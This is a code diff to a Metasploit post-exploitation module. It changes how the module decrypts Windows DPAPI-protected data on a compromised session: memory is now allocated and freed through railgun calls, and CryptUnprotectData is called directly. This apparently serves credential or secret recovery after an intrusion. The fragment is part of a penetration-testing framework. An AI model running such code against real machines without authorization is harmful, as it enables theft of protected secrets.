@@ -128,30 +128,32 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_data(data)
-    pid = session.sys.process.open.pid
-    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
-
     memsize = 1024 * ((data.length + 1023) / 1024)
-    mem = process.memory.allocate(memsize)
-    process.memory.write(mem, data)
+    mem_alloc = session.railgun.kernel32.LocalAlloc(0, data.length)
+    mem = mem_alloc['return']
+    session.railgun.memwrite(mem, data, data.length)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
-      addr = [mem].pack("V")
-      len = [data.length].pack("V")
+    if session.arch == 'x86'
+      addr = [mem].pack('V')
+      len = [data.length].pack('V')
       pdatain = "#{len}#{addr}".force_encoding('ascii')
       ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
-      len, addr = ret["pDataOut"].unpack("V2")
+      len, addr = ret['pDataOut'].unpack('V2')
     else
-      addr = [mem].pack("Q")
-      len = [data.length].pack("Q")
+      addr = [mem].pack('Q')
+      len = [data.length].pack('Q')
       pdatain = "#{len}#{addr}".force_encoding('ascii')
       ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
-      len, addr = ret["pDataOut"].unpack("Q2")
+      len, addr = ret['pDataOut'].unpack('Q2')
     end
 
     return nil if len == 0
 
-    decrypted = process.memory.read(addr, len)
+    decrypted = session.railgun.memread(addr, len)
+
+    session.railgun.kernel32.LocalFree(mem)
+    session.railgun.kernel32.LocalFree(addr)
+
     return decrypted
   end
 
